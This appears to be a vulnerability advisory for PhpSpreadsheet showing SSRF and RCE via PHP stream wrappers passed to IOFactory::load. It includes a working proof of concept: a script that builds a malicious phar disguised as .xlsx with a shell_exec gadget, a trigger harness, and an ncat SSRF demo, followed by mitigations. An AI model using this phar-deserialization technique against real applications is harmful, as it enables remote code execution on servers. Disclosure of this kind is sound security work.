summary: "PhpSpreadsheet has SSRF/RCE in IOFactory::load when $filename is user controlled\n\
  The usage of `is_file`, used to verify if the `$filename` is indeed an actual file, by all(?)\
  \ `Reader` implementations (inside the helper function `File::assertFile`) is php-wrapper\
  \ aware, for any [php wrappers](https://www.php.net/manual/en/wrappers.php) implementing `stat()`.\n\
  The 3 wrappers `ftp://`, `phar://` and `ssh2.sftp://`, all satisfy this requirement - 2 of\
  \ which are shown in the PoC below.\n\nThis results in a SSRF, at \"best\", and RCE at worse.\n\
  \nThis was tested against the `latest` release - but the issue seems to go back a while from\
  \ a first quick check (still present in `v1.30.2`).\n\n## PoC\nTo reproduce the vulnerable\
  \ behavior, the following scripts were used:\n\n`php.ini` file, only needed to build the malicious\
  \ phar, not necessary to exploit on a deployed instance of the library:\n```ini\nphar.readonly=0\n\
  ```\n\n`make_phar.php` to create the malicious file:\n```php\n<?php\n// php -c php.ini make_phar.php\n\
  class GadgetClass {\n    public $data;\n    function __construct($d) {\n        $this->data\
  \ = $d;\n    }\n    function __destruct() {\n        shell_exec($this->data);\n    }\n}\n\n\
  $pop = new GadgetClass('touch /tmp/poc.txt');\n\n$phar = new Phar('exploit.phar');\n$phar->startBuffering();\n\
  $phar->setStub('<?php __HALT_COMPILER(); ?>');\n$phar->addFromString('whatever', 'dummy content');\n\
  $phar->setMetadata($pop);\n$phar->stopBuffering();\n\nrename('exploit.phar', 'exploit.xlsx');\
  \ // optional\necho \"exploit.xlsx created \\n\";\n\n```\n\n`test.php` showcases the unsafe\
  \ pattern:\n```php\n<?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\\
  IOFactory;\n\nclass GadgetClass {\n    public $data;\n    function __construct($d) {\n   \
  \     $this->data = $d;\n    }\n    function __destruct() {\n        shell_exec($this->data);\n\
  \    }\n}\n\n$filename = $argv[1] ?? null;\n\nif (!$filename) {\n    echo \"Usage: php test.php\
  \ <path>\\n\";\n    echo \"  e.g. php test.php phar://exploit.xlsx/whatever\\n\";\n    exit(1);\n\
  }\n\necho \"Calling IOFactory::load('\" . $filename . \"')\\n\";\n\ntry {\n    $spreadsheet\
  \ = IOFactory::load($filename);\n    var_dump($spreadsheet);\n} catch (Throwable $e) {\n \
  \   echo \"Vuln has still triggered even if exception triggers.\\n\";\n}\n\n\n```\n### RCE\
  \ \nRun the PoC (for RCE):\n```bash\nphp -c php.ini make_phar.php && php test.php phar://exploit.xlsx/test;\
  \ ls -lah /tmp/poc.txt\n```\nThe file `/tmp/poc.txt` should now be present on disk.\n> Note:\
  \ the vuln still triggers if the file pointed to inside the phar does not exist/is not supported\
  \ (html, xlsx, etc...). This means an attacker could \"silently\" trigger the vuln without\
  \ leaving any error logs if the file inside the phar exists and is supported instead. \n\n\
  ### SSRF\nRun the PoC (for SSRF):\n```bash\nncat -lvp 21 #run on another terminal\nphp test.php\
  \ ftp://127.0.0.1:21/test\n```\n\nObserve a connection is made to `127.0.0.1` on port `21`.\n\
  \n\n\n## Root Cause Analysis \n\nFollowing the API exposed by the library, using `IOFactory::load`,\
  \ the code proceeds as follows:\n```php\nIOFactory::load($filename) -> IReader::load($filename,\
  \ $flags) -> IReader::loadSpreadsheetFromFile($filename) ->  File::assertFile($filename, ...)\
  \ -> is_file($filename);\n```\n\n\nThe one obvious gadget that was found is guarded via `__unserialize`\
  \ (or `__wakeup` in older versions) in the `XMLWriter` class, making it not possible to use\
  \ the phar deserialization as a standalone attack vector using just this library - it is still\
  \ viable to create \"POP\" gadget chains via other classes which may be available in real-world\
  \ deployment scenarios.\n\n```php\n    public function __destruct()\n    {\n        // Unlink\
  \ temporary files\n        // There is nothing reasonable to do if unlink fails.\n       \
  \ if ($this->tempFileName != '') {\n            @unlink($this->tempFileName);\n        }\n\
  \    }\n\n    /** @param mixed[] $data */\n    public function __unserialize(array $data):\
  \ void\n    {\n        $this->tempFileName = '';\n\n        throw new SpreadsheetException('Unserialize\
  \ not permitted');\n    }\n```\n\nPhpspreadsheet is used as a backbone for many library wrappers,\
  \ including very widespread ones from [packagist ](https://packagist.org)like `maatwebsite/excel`\
  \ for Laravel, `sonata-project/exporter` and so on, hence the deserialization vector stays\
  \ relevant in other contexts.\n\n## Suggested mitigations\n\nUse `is_file` only after making\
  \ sure the filename does not contain any php wrapper:\n```php\n$scheme = parse_url($filename,\
  \ PHP_URL_SCHEME);\n// strlen check > 1 to avoid issues with Windows absolute paths (e.g.\
  \ C:\\...), Windows quirks :)\n// since no built-in or commonly registered PHP stream wrapper\
  \ uses a single-character scheme, this should be ok, to my knowledge\nif ($scheme !== null\
  \ && strlen($scheme) > 1) {\n    throw new \\PhpOffice\\PhpSpreadsheet\\Exception(\n     \
  \   \"Stream wrappers are not permitted as file paths: {$filename}\"\n    );\n}\n```\n\nor\
  \ perhaps even just passing it to `realpath` before calling `is_file` to ensure it is parsed\
  \ correctly:\n```php\n$real = realpath($filename); // not php wrapper aware AFAIK\nif ($real\
  \ === false) {\n    throw new \\PhpOffice\\PhpSpreadsheet\\Exception(\"Invalid file path:\
  \ {$filename}\");\n}\n\n// from here on, $real should be a clean absolute path so we can pass\
  \ it to is_file()\nif (!is_file($real)) {\n    throw new ...\n}\n```\n\n> Note: `stream_is_local()`\
  \ would also not be safe here — as it considers `phar://` to be local and would not block\
  \ it."
